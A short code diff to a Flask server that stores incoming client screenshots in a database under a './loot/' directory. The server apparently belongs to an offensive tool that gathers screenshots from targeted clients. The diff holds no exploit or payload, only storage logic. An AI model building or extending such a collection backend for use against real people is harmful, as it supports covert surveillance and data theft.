@@ -91,7 +91,7 @@ class Client(db.Model):
 class Screenshot(db.Model):
     id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
-    url       = db.Column(db.String(100), nullable=False)
+    # url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
     fileName  = db.Column(db.String(100), nullable=False)
   
@@ -313,6 +313,13 @@ def recordScreenshot(identifier):
         logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
         binary_file.write(image)
         binary_file.close()
+
+    # Put it in the DB
+    newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
+    db.session.add(newScreenshot)
+    clientSeen(identifier)
+    dbCommit()
+
 
     return "ok", 200
 
